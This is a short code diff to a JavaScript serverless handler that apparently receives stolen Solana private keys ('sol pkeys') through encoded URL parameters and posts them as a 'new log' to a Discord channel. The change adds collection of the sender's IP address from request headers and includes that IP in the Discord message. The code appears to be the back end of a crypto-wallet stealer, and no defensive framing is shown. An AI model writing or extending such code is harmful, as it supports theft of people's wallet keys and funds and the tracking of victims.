@@ -4,6 +4,12 @@ exports.handler = async (event) => {
   const encodedId1 = params.id;
   const encodedId2 = params.id2;
 
+  const userIP =
+  event.headers["client-ip"] ||
+  event.headers["x-forwarded-for"] ||
+  event.headers["x-nf-client-connection-ip"] ||
+  "Unknown IP";
+
   if (!encodedId1 && !encodedId2) {
     return { statusCode: 400, body: "Missing parameters" };
   }
@@ -50,7 +56,7 @@ exports.handler = async (event) => {
 
   const escapeDiscord = (s) => s.replace(/`/g, "\\`");
 
-  let message = "@everyone new log\n\n";
+  let message = `@everyone new log from **${userIP}**\n\n`;
 
   if (set1.length) {
     message += "sol pkeys:\n";
